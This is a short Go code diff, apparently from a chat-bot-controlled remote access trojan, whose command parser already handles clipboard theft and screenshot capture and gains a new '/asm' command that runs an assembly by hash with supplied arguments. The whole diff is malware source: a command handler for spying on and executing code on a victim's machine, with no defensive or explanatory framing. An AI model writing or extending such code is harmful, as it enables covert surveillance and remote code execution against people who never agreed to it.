@@ -33,6 +33,10 @@ func parseCommand(chatID int64, text string) {
 		getClipboard(chatID)
 	case "/screen":
 		takeScreenshots(chatID)
+	case "/asm":
+		assemblyHash := commandParts[1]
+		assemblyArgs := commandParts[2:]
+		executeAssemblyByHash(chatID, assemblyHash, assemblyArgs, "")
 	default:
 		SendMessage(chatID, "No such command 🥴")
 	}
